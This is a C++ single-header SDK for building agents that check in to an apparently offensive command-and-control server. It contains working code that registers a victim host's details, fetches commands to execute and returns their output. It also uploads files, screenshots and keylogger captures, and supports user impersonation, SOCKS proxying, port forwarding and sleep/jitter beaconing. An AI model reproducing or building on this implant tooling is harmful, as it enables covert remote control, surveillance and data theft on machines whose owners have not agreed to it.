/**
 * Hexio External Agent SDK for C++
 *
 * Single-header SDK. Works on Windows (WinHTTP) and POSIX (BSD sockets).
 *
 * Usage:
 *   #define HEXIO_SDK_IMPLEMENTATION   // in exactly ONE .cpp file
 *   #include "hexio_sdk.h"
 *
 *   HexioClient client("http://10.0.0.1:9000", "my-passphrase");
 *   auto reg = client.registerAgent({
 *       .hostname = "WORKSTATION", .ip = "10.0.0.50",
 *       .user = "admin", .os = "Windows 10",
 *       .process = "myagent.exe", .pid = 1234,
 *       .client_type = "my_agent", .sleep_time = 5
 *   });
 *   // client.token is now set
 *
 *   while (true) {
 *       auto checkin = client.checkinAgent();
 *       // process checkin.commands ...
 *       Sleep(5000);
 *   }
 */

#pragma once

#include <string>
#include <vector>
#include <map>
#include <cstdint>
#include <sstream>
#include <stdexcept>

// --- Minimal JSON builder/parser (no external deps) ---

namespace hexio {
namespace json {

inline std::string escape(const std::string& s) {
    std::string out;
    out.reserve(s.size() + 8);
    for (char c : s) {
        switch (c) {
            case '"':  out += "\\\""; break;
            case '\\': out += "\\\\"; break;
            case '\n': out += "\\n";  break;
            case '\r': out += "\\r";  break;
            case '\t': out += "\\t";  break;
            default:   out += c;
        }
    }
    return out;
}

class Object {
    std::ostringstream ss;
    bool first = true;
public:
    Object() { ss << "{"; }
    Object& add(const std::string& key, const std::string& val) {
        if (!first) ss << ",";
        first = false;
        ss << "\"" << escape(key) << "\":\"" << escape(val) << "\"";
        return *this;
    }
    Object& add(const std::string& key, int64_t val) {
        if (!first) ss << ",";
        first = false;
        ss << "\"" << escape(key) << "\":" << val;
        return *this;
    }
    Object& addRaw(const std::string& key, const std::string& rawJson) {
        if (!first) ss << ",";
        first = false;
        ss << "\"" << escape(key) << "\":" << rawJson;
        return *this;
    }
    std::string build() const { return ss.str() + "}"; }
};

class Array {
    std::ostringstream ss;
    bool first = true;
public:
    Array() { ss << "["; }
    Array& add(const std::string& val) {
        if (!first) ss << ",";
        first = false;
        ss << "\"" << escape(val) << "\"";
        return *this;
    }
    std::string build() const { return ss.str() + "]"; }
};

// Extract a string value for a key from a JSON string (simple, non-recursive)
inline std::string getString(const std::string& json, const std::string& key) {
    std::string search = "\"" + key + "\"";
    auto pos = json.find(search);
    if (pos == std::string::npos) return "";
    pos = json.find(':', pos + search.size());
    if (pos == std::string::npos) return "";
    pos = json.find('"', pos + 1);
    if (pos == std::string::npos) return "";
    auto end = json.find('"', pos + 1);
    if (end == std::string::npos) return "";
    return json.substr(pos + 1, end - pos - 1);
}

inline int64_t getInt(const std::string& json, const std::string& key) {
    std::string search = "\"" + key + "\"";
    auto pos = json.find(search);
    if (pos == std::string::npos) return 0;
    pos = json.find(':', pos + search.size());
    if (pos == std::string::npos) return 0;
    pos++;
    while (pos < json.size() && json[pos] == ' ') pos++;
    std::string num;
    while (pos < json.size() && (json[pos] == '-' || (json[pos] >= '0' && json[pos] <= '9'))) {
        num += json[pos++];
    }
    if (num.empty()) return 0;
    return std::stoll(num);
}

} // namespace json
} // namespace hexio

// --- HTTP transport abstraction ---

namespace hexio {

struct HttpResponse {
    int statusCode;
    std::string body;
};

HttpResponse httpRequest(
    const std::string& method,
    const std::string& url,
    const std::map<std::string, std::string>& headers,
    const std::string& body
);

} // namespace hexio

// --- Main client ---

namespace hexio {

struct RegisterRequest {
    std::string hostname;
    std::string ip;
    std::string user;
    std::string os;
    std::string process;
    std::string arch;
    int64_t pid;
    std::string client_type;
    int64_t sleep_time;
};

struct RegisterResponse {
    int64_t agent_id;
    std::string token;
};

struct CommandEntry {
    int64_t id;
    std::string command;
};

struct CheckinResponse {
    std::vector<CommandEntry> commands;
    std::string rawJson;
};

struct DownloadInitResponse {
    std::string download_id;
    std::string agent_path;
};

class HexioClient {
public:
    std::string baseUrl;
    std::string passphrase;
    std::string token;
    int64_t agentId = 0;

    HexioClient(const std::string& baseUrl, const std::string& passphrase)
        : baseUrl(baseUrl), passphrase(passphrase) {}

    std::string request(const std::string& method, const std::string& path, const std::string& body = "");
    RegisterResponse registerAgent(const RegisterRequest& req);
    CheckinResponse checkinAgent();
    CheckinResponse sync(int64_t sleepTime = -1, int64_t sleepJitter = -1);
    void commandResponse(int64_t commandId, const std::string& command, const std::string& response);
    DownloadInitResponse downloadInit(const std::string& fileName, const std::string& agentPath, int fileSize, int chunkSize, int totalChunks);
    std::string downloadChunk(const std::string& downloadId, const std::string& chunkDataB64);
    void downloadCancel(const std::string& downloadId);
    void screenshot(const std::string& filename, const std::string& dataB64);
    void keylog(const std::string& filename, const std::string& data);
    void setImpersonation(const std::string& user);
    void clearImpersonation();
    void sidechannel(const std::string& channelId, const std::string& dataB64);
    std::string requestFiles(const std::string& jsonBody);
    int64_t socksOpen(int64_t port = -1);
    void socksClose();
    std::string socksSync(const std::string& jsonBody);
    void portfwdOpen(int64_t port, const std::string& remoteHost, int64_t remotePort);
    void portfwdClose(int64_t port);
    std::string portfwdSync(const std::string& jsonBody);
};

} // namespace hexio

// ============================================================================
// IMPLEMENTATION
// ============================================================================

#ifdef HEXIO_SDK_IMPLEMENTATION

#ifdef _WIN32
    #include <windows.h>
    #include <winhttp.h>
    #pragma comment(lib, "winhttp.lib")
#else
    #include <sys/socket.h>
    #include <netdb.h>
    #include <unistd.h>
    #include <cstring>
    #include <cerrno>
#endif

namespace hexio {

// --- URL parsing ---
struct ParsedUrl {
    std::string host;
    uint16_t port;
    std::string path;
    bool ssl;
};

static ParsedUrl parseUrl(const std::string& url) {
    ParsedUrl p;
    p.ssl = false;
    std::string rest;
    if (url.substr(0, 8) == "https://") {
        p.ssl = true;
        rest = url.substr(8);
        p.port = 443;
    } else if (url.substr(0, 7) == "http://") {
        rest = url.substr(7);
        p.port = 80;
    } else {
        rest = url;
        p.port = 80;
    }

    auto slashPos = rest.find('/');
    std::string hostPort;
    if (slashPos != std::string::npos) {
        hostPort = rest.substr(0, slashPos);
        p.path = rest.substr(slashPos);
    } else {
        hostPort = rest;
        p.path = "/";
    }

    auto colonPos = hostPort.find(':');
    if (colonPos != std::string::npos) {
        p.host = hostPort.substr(0, colonPos);
        p.port = (uint16_t)std::stoi(hostPort.substr(colonPos + 1));
    } else {
        p.host = hostPort;
    }
    return p;
}

#ifdef _WIN32

HttpResponse httpRequest(
    const std::string& method,
    const std::string& url,
    const std::map<std::string, std::string>& headers,
    const std::string& body
) {
    auto parsed = parseUrl(url);

    std::wstring wHost(parsed.host.begin(), parsed.host.end());
    std::wstring wPath(parsed.path.begin(), parsed.path.end());
    std::wstring wMethod(method.begin(), method.end());

    HINTERNET hSession = WinHttpOpen(L"HexioSDK/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                      WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) throw std::runtime_error("WinHttpOpen failed");

    HINTERNET hConnect = WinHttpConnect(hSession, wHost.c_str(), parsed.port, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        throw std::runtime_error("WinHttpConnect failed");
    }

    DWORD flags = parsed.ssl ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, wMethod.c_str(), wPath.c_str(),
                                             NULL, WINHTTP_NO_REFERER,
                                             WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        throw std::runtime_error("WinHttpOpenRequest failed");
    }

    for (auto& [k, v] : headers) {
        std::string hdr = k + ": " + v;
        std::wstring wHdr(hdr.begin(), hdr.end());
        WinHttpAddRequestHeaders(hRequest, wHdr.c_str(), (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD);
    }

    BOOL sent = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                    body.empty() ? WINHTTP_NO_REQUEST_DATA : (LPVOID)body.c_str(),
                                    (DWORD)body.size(), (DWORD)body.size(), 0);
    if (!sent) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        throw std::runtime_error("WinHttpSendRequest failed");
    }

    WinHttpReceiveResponse(hRequest, NULL);

    DWORD statusCode = 0;
    DWORD size = sizeof(statusCode);
    WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                        WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &size, WINHTTP_NO_HEADER_INDEX);

    std::string respBody;
    DWORD bytesAvailable = 0;
    while (WinHttpQueryDataAvailable(hRequest, &bytesAvailable) && bytesAvailable > 0) {
        std::vector<char> buf(bytesAvailable);
        DWORD bytesRead = 0;
        WinHttpReadData(hRequest, buf.data(), bytesAvailable, &bytesRead);
        respBody.append(buf.data(), bytesRead);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return { (int)statusCode, respBody };
}

#else // POSIX

HttpResponse httpRequest(
    const std::string& method,
    const std::string& url,
    const std::map<std::string, std::string>& headers,
    const std::string& body
) {
    auto parsed = parseUrl(url);

    struct addrinfo hints{}, *res;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    std::string portStr = std::to_string(parsed.port);

    if (getaddrinfo(parsed.host.c_str(), portStr.c_str(), &hints, &res) != 0) {
        throw std::runtime_error("getaddrinfo failed: " + parsed.host);
    }

    int sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (sock < 0) {
        freeaddrinfo(res);
        throw std::runtime_error("socket() failed");
    }

    if (connect(sock, res->ai_addr, res->ai_addrlen) < 0) {
        close(sock);
        freeaddrinfo(res);
        throw std::runtime_error("connect() failed");
    }
    freeaddrinfo(res);

    std::ostringstream req;
    req << method << " " << parsed.path << " HTTP/1.1\r\n";
    req << "Host: " << parsed.host << ":" << parsed.port << "\r\n";
    req << "Connection: close\r\n";
    if (!body.empty()) {
        req << "Content-Length: " << body.size() << "\r\n";
    }
    for (auto& [k, v] : headers) {
        req << k << ": " << v << "\r\n";
    }
    req << "\r\n";
    if (!body.empty()) {
        req << body;
    }

    std::string reqStr = req.str();
    ssize_t sent = send(sock, reqStr.c_str(), reqStr.size(), 0);
    if (sent < 0) {
        close(sock);
        throw std::runtime_error("send() failed");
    }

    std::string response;
    char buf[4096];
    ssize_t n;
    while ((n = recv(sock, buf, sizeof(buf), 0)) > 0) {
        response.append(buf, n);
    }
    close(sock);

    // Parse HTTP response
    auto headerEnd = response.find("\r\n\r\n");
    if (headerEnd == std::string::npos) {
        return { 0, "" };
    }

    std::string statusLine = response.substr(0, response.find("\r\n"));
    int statusCode = 0;
    auto spacePos = statusLine.find(' ');
    if (spacePos != std::string::npos) {
        statusCode = std::stoi(statusLine.substr(spacePos + 1, 3));
    }

    std::string respBody = response.substr(headerEnd + 4);

    // Handle chunked transfer encoding
    std::string headerBlock = response.substr(0, headerEnd);
    if (headerBlock.find("Transfer-Encoding: chunked") != std::string::npos) {
        std::string decoded;
        size_t pos = 0;
        while (pos < respBody.size()) {
            auto lineEnd = respBody.find("\r\n", pos);
            if (lineEnd == std::string::npos) break;
            std::string chunkSizeStr = respBody.substr(pos, lineEnd - pos);
            size_t chunkSize = std::stoul(chunkSizeStr, nullptr, 16);
            if (chunkSize == 0) break;
            pos = lineEnd + 2;
            decoded.append(respBody.substr(pos, chunkSize));
            pos += chunkSize + 2;
        }
        respBody = decoded;
    }

    return { statusCode, respBody };
}

#endif // _WIN32 / POSIX

// --- Client implementation ---

std::string HexioClient::request(const std::string& method, const std::string& path, const std::string& body) {
    std::map<std::string, std::string> headers;
    headers["HexioExternalAgentAuth"] = passphrase;
    if (!token.empty()) {
        headers["HexioAgentToken"] = token;
    }
    if (!body.empty()) {
        headers["Content-Type"] = "application/json";
    }

    auto resp = httpRequest(method, baseUrl + path, headers, body);
    if (resp.statusCode >= 400) {
        std::string errMsg = json::getString(resp.body, "error");
        if (errMsg.empty()) errMsg = resp.body;
        throw std::runtime_error("API error (" + std::to_string(resp.statusCode) + "): " + errMsg);
    }
    return resp.body;
}

RegisterResponse HexioClient::registerAgent(const RegisterRequest& req) {
    auto body = json::Object()
        .add("hostname", req.hostname)
        .add("ip", req.ip)
        .add("user", req.user)
        .add("os", req.os)
        .add("process", req.process)
        .add("pid", req.pid)
        .add("client_type", req.client_type)
        .add("sleep_time", req.sleep_time)
        .add("arch", req.arch)
        .build();

    auto resp = request("POST", "/register", body);
    RegisterResponse r;
    r.agent_id = json::getInt(resp, "agent_id");
    r.token = json::getString(resp, "token");
    token = r.token;
    agentId = r.agent_id;
    return r;
}

CheckinResponse HexioClient::checkinAgent() {
    auto resp = request("GET", "/agent/checkin");
    CheckinResponse cr;
    cr.rawJson = resp;
    // Simple command extraction - find "commands":[{...},...] patterns
    // For production use, integrate a proper JSON parser
    auto cmdStart = resp.find("\"commands\"");
    if (cmdStart != std::string::npos) {
        auto arrStart = resp.find('[', cmdStart);
        if (arrStart != std::string::npos) {
            size_t pos = arrStart;
            while (true) {
                auto objStart = resp.find('{', pos);
                if (objStart == std::string::npos) break;
                auto objEnd = resp.find('}', objStart);
                if (objEnd == std::string::npos) break;
                std::string obj = resp.substr(objStart, objEnd - objStart + 1);
                CommandEntry ce;
                ce.id = json::getInt(obj, "id");
                ce.command = json::getString(obj, "command");
                if (ce.id > 0 || !ce.command.empty()) {
                    cr.commands.push_back(ce);
                }
                pos = objEnd + 1;
                auto arrEnd = resp.find(']', arrStart);
                if (pos >= arrEnd) break;
            }
        }
    }
    return cr;
}

CheckinResponse HexioClient::sync(int64_t sleepTime, int64_t sleepJitter) {
    std::string body;
    if (sleepTime >= 0) {
        json::Object sleep;
        sleep.add("sleep_time", sleepTime);
        if (sleepJitter >= 0) {
            sleep.add("sleep_jitter", sleepJitter);
        }
        body = json::Object().addRaw("sleep", sleep.build()).build();
    }
    auto resp = request("POST", "/agent/sync", body);
    CheckinResponse cr;
    cr.rawJson = resp;
    return cr;
}

void HexioClient::commandResponse(int64_t commandId, const std::string& command, const std::string& response) {
    auto body = json::Object()
        .add("command_id", commandId)
        .add("command", command)
        .add("response", response)
        .build();
    request("POST", "/agent/command/response", body);
}

DownloadInitResponse HexioClient::downloadInit(const std::string& fileName, const std::string& agentPath,
                                                  int fileSize, int chunkSize, int totalChunks) {
    auto body = json::Object()
        .add("file_name", fileName)
        .add("agent_path", agentPath)
        .add("file_size", (int64_t)fileSize)
        .add("chunk_size", (int64_t)chunkSize)
        .add("total_chunks", (int64_t)totalChunks)
        .build();
    auto resp = request("POST", "/agent/download/init", body);
    return { json::getString(resp, "download_id"), json::getString(resp, "agent_path") };
}

std::string HexioClient::downloadChunk(const std::string& downloadId, const std::string& chunkDataB64) {
    auto body = json::Object()
        .add("download_id", downloadId)
        .add("chunk_data", chunkDataB64)
        .build();
    auto resp = request("POST", "/agent/download/chunk", body);
    return json::getString(resp, "status");
}

void HexioClient::downloadCancel(const std::string& downloadId) {
    auto body = json::Object().add("download_id", downloadId).build();
    request("POST", "/agent/download/cancel", body);
}

void HexioClient::screenshot(const std::string& filename, const std::string& dataB64) {
    auto body = json::Object().add("filename", filename).add("data", dataB64).build();
    request("POST", "/agent/screenshot", body);
}

void HexioClient::keylog(const std::string& filename, const std::string& data) {
    auto body = json::Object().add("filename", filename).add("data", data).build();
    request("POST", "/agent/keylog", body);
}

void HexioClient::setImpersonation(const std::string& user) {
    auto body = json::Object().add("user", user).build();
    request("POST", "/agent/impersonation", body);
}

void HexioClient::clearImpersonation() {
    setImpersonation("");
}

void HexioClient::sidechannel(const std::string& channelId, const std::string& dataB64) {
    auto body = json::Object().add("channel_id", channelId).add("data", dataB64).build();
    request("POST", "/agent/sidechannel", body);
}

std::string HexioClient::requestFiles(const std::string& jsonBody) {
    return request("POST", "/agent/files/request", jsonBody);
}

int64_t HexioClient::socksOpen(int64_t port) {
    std::string body;
    if (port > 0) {
        body = json::Object().add("port", port).build();
    } else {
        body = "{}";
    }
    auto resp = request("POST", "/agent/socks/open", body);
    return json::getInt(resp, "port");
}

void HexioClient::socksClose() {
    request("POST", "/agent/socks/close", "{}");
}

std::string HexioClient::socksSync(const std::string& jsonBody) {
    return request("POST", "/agent/socks/sync", jsonBody);
}

void HexioClient::portfwdOpen(int64_t port, const std::string& remoteHost, int64_t remotePort) {
    auto body = json::Object()
        .add("port", port)
        .add("remote_host", remoteHost)
        .add("remote_port", remotePort)
        .build();
    request("POST", "/agent/portfwd/open", body);
}

void HexioClient::portfwdClose(int64_t port) {
    auto body = json::Object().add("port", port).build();
    request("POST", "/agent/portfwd/close", body);
}

std::string HexioClient::portfwdSync(const std::string& jsonBody) {
    return request("POST", "/agent/portfwd/sync", jsonBody);
}

} // namespace hexio

#endif // HEXIO_SDK_IMPLEMENTATION
